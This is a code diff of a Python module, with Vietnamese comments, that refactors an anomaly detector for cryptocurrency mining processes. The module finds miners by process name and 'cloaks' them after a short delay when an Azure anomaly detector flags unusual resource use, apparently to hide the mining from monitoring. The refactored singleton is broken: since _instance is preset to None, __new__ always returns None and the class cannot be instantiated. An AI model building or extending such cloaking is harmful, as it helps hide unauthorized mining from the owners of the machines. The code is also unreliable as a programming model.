@@ -4,17 +4,23 @@ import psutil
 import logging
 import traceback
 import asyncio
+import pynvml
 from asyncio import Event
 from typing import List, Dict, Any
-from threading import Lock
+from contextvars import ContextVar
 
-import pynvml
 
-from .base_manager import BaseManager
+
+
 from .utils import MiningProcess
-from .auxiliary_modules.power_management import get_cpu_power, get_gpu_power
-from .auxiliary_modules.temperature_monitor import get_cpu_temperature, get_gpu_temperature
-from .interfaces import IResourceManager
+from .anomaly_evaluator import SafeRestoreEvaluator
+
+
+from .auxiliary_modules.models import ConfigModel
+from .auxiliary_modules.event_bus import EventBus
+from .auxiliary_modules.interfaces import IResourceManager
+
+
 
 ###############################################################################
 #   QUẢN LÝ NVML TOÀN CỤC CHO MODULE (KHÔNG CÒN GPUManager RIÊNG)            #
@@ -39,182 +45,38 @@ def is_nvml_initialized() -> bool:
 #            LỚP ĐÁNH GIÁ KHẢ NĂNG PHỤC HỒI: SafeRestoreEvaluator             #
 ###############################################################################
 
-class SafeRestoreEvaluator:
-    """
-    Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho tiến trình.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
-        self.config = config
-        self.logger = logger
-        self.resource_manager = resource_manager
-
-        # Ngưỡng baseline
-        baseline_thresholds = self.config.get('baseline_thresholds', {})
-        self.baseline_cpu_usage_percent = baseline_thresholds.get('cpu_usage_percent', 80)
-        self.baseline_gpu_usage_percent = baseline_thresholds.get('gpu_usage_percent', 80)
-        self.baseline_ram_usage_percent = baseline_thresholds.get('ram_usage_percent', 80)
-        self.baseline_disk_io_usage_mbps = baseline_thresholds.get('disk_io_usage_mbps', 80)
-        self.baseline_network_usage_mbps = baseline_thresholds.get('network_usage_mbps', 80)
-
-        # Giới hạn nhiệt độ
-        temperature_limits = self.config.get("temperature_limits", {})
-        self.cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
-        self.gpu_max_temp = temperature_limits.get("gpu_max_celsius", 75)
-
-        # Giới hạn công suất
-        power_limits = self.config.get("power_limits", {})
-        per_device_power = power_limits.get("per_device_power_watts", {})
-        self.cpu_max_power = per_device_power.get("cpu", 100)
-        self.gpu_max_power = per_device_power.get("gpu", 200)
-
-    async def is_safe_to_restore(self, process: MiningProcess) -> bool:
-        """
-        Kiểm tra các điều kiện an toàn để khôi phục tài nguyên cho tiến trình.
-        """
-        # 1) Kiểm tra PID tồn tại
-        if not psutil.pid_exists(process.pid):
-            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
-            return False
-
-        # 2) Kiểm tra nhiệt độ CPU
-        try:
-            cpu_temp = await asyncio.get_event_loop().run_in_executor(None, get_cpu_temperature, process.pid)
-            if cpu_temp is not None and cpu_temp >= self.cpu_max_temp:
-                self.logger.info(f"Nhiệt độ CPU {cpu_temp}°C vẫn cao (PID={process.pid}).")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra nhiệt độ CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 3) Kiểm tra nhiệt độ GPU
-        try:
-            if not is_nvml_initialized():
-                initialize_nvml()
-
-            gpu_temps = await asyncio.get_event_loop().run_in_executor(None, get_gpu_temperature, process.pid)
-            if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
-                self.logger.info(f"Nhiệt độ GPU {gpu_temps}°C vẫn cao (PID={process.pid}).")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra nhiệt độ GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 4) Kiểm tra công suất CPU
-        try:
-            cpu_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
-            if cpu_power is not None and cpu_power >= self.cpu_max_power:
-                self.logger.info(f"Công suất CPU {cpu_power}W vẫn cao (PID={process.pid}).")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra công suất CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 5) Kiểm tra công suất GPU
-        try:
-            if not is_nvml_initialized():
-                initialize_nvml()
-
-            gpu_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
-            if isinstance(gpu_power, list):
-                if sum(gpu_power) >= self.gpu_max_power:
-                    self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
-                    return False
-            else:
-                if gpu_power >= self.gpu_max_power:
-                    self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
-                    return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra công suất GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 6) Kiểm tra CPU usage tổng thể
-        try:
-            total_cpu_usage = psutil.cpu_percent(interval=1)
-            if total_cpu_usage >= self.baseline_cpu_usage_percent:
-                self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra CPU tổng thể: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 7) Kiểm tra RAM
-        try:
-            ram = psutil.virtual_memory()
-            if ram.percent >= self.baseline_ram_usage_percent:
-                self.logger.info(f"Sử dụng RAM tổng thể {ram.percent}% vẫn cao.")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra RAM tổng thể: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 8) Kiểm tra Disk I/O
-        try:
-            disk_io_counters = psutil.disk_io_counters()
-            total_disk_io_usage_mbps = (disk_io_counters.read_bytes + disk_io_counters.write_bytes) / (1024 * 1024)
-            if total_disk_io_usage_mbps >= self.baseline_disk_io_usage_mbps:
-                self.logger.info(f"Sử dụng Disk I/O {total_disk_io_usage_mbps:.2f} MBps vẫn cao.")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra Disk I/O: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 9) Kiểm tra mạng
-        try:
-            net_io_counters = psutil.net_io_counters()
-            total_network_usage_mbps = (net_io_counters.bytes_sent + net_io_counters.bytes_recv) / (1024 * 1024)
-            if total_network_usage_mbps >= self.baseline_network_usage_mbps:
-                self.logger.info(f"Sử dụng mạng {total_network_usage_mbps:.2f} MBps vẫn cao.")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi kiểm tra mạng: {e}\n{traceback.format_exc()}")
-            return False
-
-        # 10) Kiểm tra bất thường qua Azure AnomalyDetector
-        try:
-            current_state = await self.resource_manager.collect_metrics(process)
-            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
-            if anomalies_detected:
-                self.logger.info(f"Azure Anomaly Detector phát hiện bất thường (PID={process.pid}).")
-                return False
-        except Exception as e:
-            self.logger.error(f"Lỗi qua Azure Anomaly Detector PID={process.pid}: {e}\n{traceback.format_exc()}")
-            return False
-
-        # Tất cả điều kiện ok => True
-        self.logger.info(f"Đủ điều kiện an toàn để khôi phục cho PID={process.pid}.")
-        return True
+# Giả sử lớp SafeRestoreEvaluator được định nghĩa trong anomaly_evaluator.py
+# (Bạn cần tạo module này tương ứng với logic SafeRestoreEvaluator)
 
 ###############################################################################
 #                           LỚP CHÍNH: AnomalyDetector                        #
 ###############################################################################
 
-class AnomalyDetector(BaseManager):
+class AnomalyDetector:
     """
     Lớp phát hiện bất thường cho tiến trình khai thác.
     Sử dụng event-driven thay vì polling liên tục.
     """
-    _instance = None
-    _instance_lock = Lock()
 
-    def __new__(cls, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
-        with cls._instance_lock:
-            if cls._instance is None:
-                cls._instance = super(AnomalyDetector, cls).__new__(cls)
+    _instance = None
+    _instance_lock = asyncio.Lock()
+
+    def __new__(cls, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
+        if not hasattr(cls, '_instance'):
+            cls._instance = super(AnomalyDetector, cls).__new__(cls)
         return cls._instance
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
-        BaseManager.__init__(self, config, logger)
-
-        if getattr(self, '_initialized', False):
+    def __init__(self, config: ConfigModel, event_bus: EventBus, logger: logging.Logger, resource_manager: IResourceManager):
+        if hasattr(self, '_initialized') and self._initialized:
             return
         self._initialized = True
 
-        self.logger = logger
         self.config = config
+        self.event_bus = event_bus
+        self.logger = logger
         self.resource_manager = resource_manager
 
-        self.stop_event = Event()
+        self.stop_event = asyncio.Event()
         self.mining_processes: List[MiningProcess] = []
         self.mining_processes_lock = asyncio.Lock()
 
@@ -229,6 +91,9 @@ class AnomalyDetector(BaseManager):
 
         self.logger.info("AnomalyDetector đã được khởi tạo với ResourceManager.")
 
+        # Đăng ký lắng nghe sự kiện từ EventBus nếu cần thiết
+        # self.event_bus.subscribe('some_event', self.handle_some_event)
+
     async def start(self):
         """
         Khởi động AnomalyDetector. Gọi discover_mining_processes_async() ban đầu.
@@ -241,8 +106,8 @@ class AnomalyDetector(BaseManager):
         """
         Tìm các tiến trình khai thác dựa trên config (CPU/GPU).
         """
-        cpu_name = self.config['processes'].get('CPU', '').lower()
-        gpu_name = self.config['processes'].get('GPU', '').lower()
+        cpu_name = self.config.processes.get('CPU', '').lower()
+        gpu_name = self.config.processes.get('GPU', '').lower()
 
         async with self.mining_processes_lock:
             self.mining_processes.clear()
@@ -251,7 +116,7 @@ class AnomalyDetector(BaseManager):
                     proc_name = proc.info['name'].lower()
                     if cpu_name in proc_name or gpu_name in proc_name:
                         priority = self.get_process_priority(proc.info['name'])
-                        net_if = self.config.get('network_interface', 'eth0')
+                        net_if = self.config.network_interface
                         mp = MiningProcess(proc.info['pid'], proc.info['name'], priority, net_if, self.logger)
                         mp.is_cloaked = False
                         self.mining_processes.append(mp)
@@ -262,7 +127,7 @@ class AnomalyDetector(BaseManager):
 
     def get_process_priority(self, process_name: str) -> int:
         """Lấy độ ưu tiên của tiến trình dựa trên config."""
-        priority_map = self.config.get('process_priority_map', {})
+        priority_map = self.config.process_priority_map
         val = priority_map.get(process_name.lower(), 1)
         if not isinstance(val, int):
             self.logger.warning(f"Độ ưu tiên của '{process_name}' không phải int => gán = 1.")
@@ -277,8 +142,8 @@ class AnomalyDetector(BaseManager):
         """
         Coroutine chính để phát hiện bất thường cho các tiến trình.
         """
-        detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
-        cloak_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
+        detection_interval = self.config.monitoring_parameters.get("detection_interval_seconds", 3600)
+        cloak_delay = self.config.monitoring_parameters.get("cloak_activation_delay_seconds", 5)
 
         while not self.stop_event.is_set():
             try:
@@ -313,7 +178,7 @@ class AnomalyDetector(BaseManager):
                 return
 
             current_state = await self.resource_manager.collect_metrics(process)
-            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
+            anomalies_detected = await self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
             if anomalies_detected:
                 self.logger.warning(f"Phát hiện bất thường {process.name} (PID={process.pid}). Cloak sau {cloak_delay}s.")
                 await asyncio.sleep(cloak_delay)
